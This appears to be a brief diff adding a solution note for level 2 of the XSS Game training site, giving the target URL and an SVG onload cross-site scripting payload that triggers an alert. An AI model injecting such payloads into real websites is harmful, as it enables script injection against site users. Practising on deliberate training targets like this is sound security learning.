@@ -1,0 +1,5 @@
+Target: http://xss-game.appspot.com/level2/frame 
+ 
+ Maybe lucky, but the first payload i tested worked, and here it is:
+ 
+ "><svg//onload="alert(1)"</script>
